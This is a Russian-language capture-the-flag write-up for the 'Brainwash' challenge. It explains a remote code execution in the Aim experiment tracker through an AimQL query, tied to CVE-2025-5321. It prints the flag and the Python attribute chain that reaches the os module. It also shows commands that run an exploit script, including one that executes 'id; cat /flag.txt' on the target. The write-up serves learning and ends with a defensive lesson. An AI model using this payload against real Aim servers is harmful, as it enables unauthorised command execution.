# Brainwash, часть 1

**Флаг:** `avito{3Xperim3n7s_aR3_unREL1aBl3_BU7_rcE_N3V3R_liEs}`

Aim выполняет пользовательский AimQL-запрос на сервере. Ограничения выражения удаётся
обойти через Python-объекты, после чего команда читает первый флаг. В разборе эта
уязвимость связана с CVE-2025-5321.

## Решение

Для выполнения запроса в хранилище должен существовать хотя бы один `Run`. Скрипт
проверяет `/api/projects/activity/` и при необходимости создаёт запись через
`aim://<host>:30800`. Без этого шага выражение не вычисляется.

Через доступные атрибуты `Run` выражение добирается до модуля `os`:

```python
run.db.runs().session.bind.dialect.dbapi.datetime.sys.modules["os"]
```

Вызов `os.system` из запроса `/api/runs/search/run` выполняет команду. Её stdout и
stderr сохраняются в параметре нового `Run`; затем скрипт читает `params.out` через
HTTP API и выделяет флаг.

## Запуск

Нужен работающий экземпляр Aim; адрес ниже относится к экземпляру соревнования:

```bash
uv run python brainwash/pwn_brainwash.py https://brainwash-ztkaw810.avitoctf.ru/
```

Если записи уже есть, можно пропустить создание `Run` и задать свою команду:

```bash
uv run python brainwash/pwn_brainwash.py \
  https://brainwash-ztkaw810.avitoctf.ru/ --skip-seed --command 'id; cat /flag.txt'
```

Локальная проверка построения выражения:

```bash
uv run python brainwash/pwn_brainwash.py --self-test
```

[pwn_brainwash.py](pwn_brainwash.py) выполняет всю цепочку,
[rce_exec.py](rce_exec.py) даёт командный канал для следующих частей:
[Brainwash 2](../brainwash2/brainwash2_writeup.md) и
[Brainwash 3](../brainwash3/brainwash3_writeup.md).

Пользовательское выражение нельзя считать изолированным только из-за ограничения
синтаксиса. Исполнение требует отдельного процесса с минимальными правами.

Источники: [GHSA-gp5h-f9c5-8355](https://github.com/advisories/GHSA-gp5h-f9c5-8355).
